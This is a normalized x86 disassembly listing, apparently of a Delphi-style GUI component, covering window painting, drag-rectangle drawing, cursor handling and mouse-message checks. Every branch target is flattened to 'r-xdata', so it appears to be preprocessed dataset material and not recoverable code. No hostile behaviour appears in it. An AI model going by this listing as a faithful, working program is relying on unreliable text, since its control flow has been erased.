mov [ fs : eax ] edx
push sub_44a044
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax esi
call sub_404464
mov edx eax
mov eax ebx
call sub_449f94
sub_44a068
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_423688
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44b16c
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_423688
mov [ ebx + 0x84 ] eax
sub_44a1f0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44a1e0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_447188
mov eax esi
call sub_447188
jmp r-xdata
sub_44a228
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41a62c
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a4c0
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41a64c
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a400
mov eax ebx
call sub_461df0
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403450
sub_44a2a8
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44a228
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44a228
jmp r-xdata
sub_44a2cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44a362
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a369
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
sub_44a374
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41a62c
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_41a5d0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_449958
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a400
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_449958
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4507d8
push eax
call InvalidateRect
push ebp
call sub_44a374
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44a49c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_461dc8
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44b16c
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403450
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a500
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4507d8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_44a5d9
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44e5ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4507d8
push eax
call ReleaseDC
retn
sub_44a660
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax edi
call sub_44b1a0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bce4
call sub_4039e0
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_449afc
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e7c
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44b16c
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_448308
sub_44a734
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44a770
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_44a7bc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_44a7e8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_449f5c
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_449f48
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a24
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a24
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4507d8
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_44a8cc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_44a918
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403450
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403450
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_44a9dc
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_44aa28
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_44aa74
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ab8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_423cc8
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ab96
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_44abc8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_449afc
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403450
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403450
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403450
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403450
jmp r-xdata
sub_44acb8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_419174
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44b1a0
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_449f48
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_449f5c
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_4191c4
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44ae98
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_449ad0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403450
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4507d8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4476cc
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44ae83
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4507d8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4507d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403254
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_449958
test esi esi
je r-xdata
sub_44ae98
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403450
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44bd1c
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403450
mov eax esi
call sub_449a00
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_4499bc
mov ecx eax
xor edx edx
xor eax eax
call sub_41919c
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403450
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_44af3c
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_44af6c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_44afd8
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44b098
sub_44b008
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44b038
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_449afc
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44b064
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44b098
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44b16c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44b1a0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44b238
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
